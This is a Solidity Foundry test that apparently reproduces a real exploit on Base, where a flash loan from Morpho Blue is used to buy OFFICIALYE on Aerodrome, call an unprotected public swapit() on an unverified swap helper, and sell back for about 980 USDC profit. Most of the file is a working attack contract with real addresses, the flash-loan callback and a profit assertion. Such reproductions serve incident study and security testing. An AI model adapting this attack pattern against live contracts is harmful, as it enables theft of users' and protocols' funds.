// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo - Total Lost : 980.32 USDC
// Attacker : 0x97d8170e04771826A31C4c9B81E9f9191a1C8613
// Attack Contract : 0x123c06D5CA1Dd1a518118e786A1976BED5e16aA3
// Vulnerable Contract : 0xdE7CA40aE3C3430723A2d1E3AE0e6e27152744B0
// Attack Tx : https://basescan.org/tx/0x6f027b83222ea0eea50fe673d7e14836357e55c50a551ab3e2f9623b5854b613
//
// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xdE7CA40aE3C3430723A2d1E3AE0e6e27152744B0#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/560
//
// Attack summary: The attacker flash-bought OFFICIALYE, called public swapit() on an unverified swap helper that sold its own USDC through the same Aerodrome pool, then sold OFFICIALYE back for USDC profit.
// Root cause: Public swapit() allowed any caller to trigger a contract-owned USDC swap through Aerodrome, letting the caller choose the timing and harvest the price impact.

import "../basetest.sol";
import "../interface.sol";

address constant ATTACKER = 0x97d8170e04771826A31C4c9B81E9f9191a1C8613;
address constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant OFFICIALYE_TOKEN = 0xedb54f9ffA78f0A0d50dC0c1534f4cBAd2ff3F35;
address constant VULNERABLE_SWAPPER = 0xdE7CA40aE3C3430723A2d1E3AE0e6e27152744B0;
address constant AERODROME_ROUTER = 0xcF77a3Ba9A5CA399B7c97c74d54e5b1Beb874E43;
address constant AERODROME_FACTORY = 0x420DD381b31aEf6683db6B902084cB0FFECe40Da;

interface IAerodromeRouter {
    struct Route {
        address from;
        address to;
        bool stable;
        address factory;
    }

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        Route[] calldata routes,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUnverifiedDe7cSwapper {
    function swapit() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 27_235_725;
        vm.createSelectFork("base", forkBlock);

        fundingToken = USDC_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(MORPHO_BLUE, "Morpho Blue");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(OFFICIALYE_TOKEN, "OFFICIALYE");
        vm.label(VULNERABLE_SWAPPER, "Unverified swapit target");
        vm.label(AERODROME_ROUTER, "Aerodrome Router");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = IERC20(USDC_TOKEN).balanceOf(ATTACKER);

        // step 1: deploy a fresh helper and borrow the same USDC amount from Morpho.
        vm.startPrank(ATTACKER, ATTACKER);
        OfficialYeSwapitAttack attackHelper = new OfficialYeSwapitAttack();
        attackHelper.execute(3_300_000_000);
        vm.stopPrank();

        // step 4: Morpho is repaid and the helper forwards the remaining USDC to the attacker.
        uint256 profit = IERC20(USDC_TOKEN).balanceOf(ATTACKER) - beforeBalance;
        assertGt(profit, 900_000_000, "USDC profit");
    }
}

contract OfficialYeSwapitAttack {
    address private immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function execute(
        uint256 flashLoanAmount
    ) external {
        require(msg.sender == owner, "only owner");

        IERC20(USDC_TOKEN).approve(MORPHO_BLUE, type(uint256).max);
        IMorphoBuleFlashLoan(MORPHO_BLUE).flashLoan(USDC_TOKEN, flashLoanAmount, abi.encode(VULNERABLE_SWAPPER));

        uint256 remainingUsdc = IERC20(USDC_TOKEN).balanceOf(address(this));
        IERC20(USDC_TOKEN).transfer(owner, remainingUsdc);
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external {
        require(msg.sender == MORPHO_BLUE, "only Morpho");
        address vulnerableSwapper = abi.decode(data, (address));

        IERC20(USDC_TOKEN).approve(AERODROME_ROUTER, type(uint256).max);
        IERC20(OFFICIALYE_TOKEN).approve(AERODROME_ROUTER, type(uint256).max);

        // step 2: buy OFFICIALYE before triggering the vulnerable contract's own swap.
        IAerodromeRouter.Route[] memory buyRoute = new IAerodromeRouter.Route[](1);
        buyRoute[0] =
            IAerodromeRouter.Route({from: USDC_TOKEN, to: OFFICIALYE_TOKEN, stable: false, factory: AERODROME_FACTORY});
        IAerodromeRouter(AERODROME_ROUTER)
            .swapExactTokensForTokens(assets, 1, buyRoute, address(this), block.timestamp + 1000);

        // step 3: anyone can call swapit(), forcing the target to swap its own USDC balance.
        IUnverifiedDe7cSwapper(vulnerableSwapper).swapit();

        uint256 officialYeBalance = IERC20(OFFICIALYE_TOKEN).balanceOf(address(this));
        IAerodromeRouter.Route[] memory sellRoute = new IAerodromeRouter.Route[](1);
        sellRoute[0] =
            IAerodromeRouter.Route({from: OFFICIALYE_TOKEN, to: USDC_TOKEN, stable: false, factory: AERODROME_FACTORY});
        IAerodromeRouter(AERODROME_ROUTER)
            .swapExactTokensForTokens(officialYeBalance, 1, sellRoute, address(this), block.timestamp + 1000);
    }
}
